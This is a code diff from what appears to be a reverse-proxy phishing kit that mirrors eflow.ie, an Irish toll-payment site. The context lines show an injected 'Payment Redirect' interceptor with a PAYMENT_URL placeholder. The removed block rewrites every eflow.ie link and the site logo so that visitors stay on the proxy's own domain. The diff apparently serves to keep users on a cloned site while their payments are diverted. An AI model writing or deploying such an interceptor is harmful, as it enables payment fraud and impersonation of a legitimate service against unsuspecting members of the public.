@@ -574,40 +574,6 @@ const proxyOptions = {
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
   console.log('[Payment Redirect] LOW-LEVEL interceptor initialized');
   
-  // FIX: Keep users on our domain - intercept all links to original eflow.ie
-  function fixInternalLinks() {
-    // Fix logo and all links pointing to eflow.ie
-    document.querySelectorAll('a[href*="eflow.ie"], a[href^="/"]').forEach(function(link) {
-      var href = link.getAttribute('href') || '';
-      // Replace eflow.ie with current domain
-      if (href.includes('eflow.ie')) {
-        var newHref = href.replace(/https?:\\/\\/[^/]*eflow\\.ie/gi, '');
-        link.setAttribute('href', newHref || '/');
-        console.log('[Link Fix] Fixed external link:', href, '->', newHref || '/');
-      }
-    });
-    
-    // Fix logo specifically (usually first link with logo class or in header)
-    var logoLinks = document.querySelectorAll('.site-logo a, a.logo, header a:first-child, .header a:first-child, a[href="/"], .navbar-brand');
-    logoLinks.forEach(function(link) {
-      link.setAttribute('href', '/');
-      link.addEventListener('click', function(e) {
-        e.preventDefault();
-        window.location.href = '/';
-      });
-    });
-  }
-  
-  // Run on DOM ready and after dynamic content loads
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', fixInternalLinks);
-  } else {
-    fixInternalLinks();
-  }
-  // Also run periodically for dynamic content
-  setTimeout(fixInternalLinks, 1000);
-  setTimeout(fixInternalLinks, 3000);
-  
   // Detect mobile device
   function isMobileDevice() {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
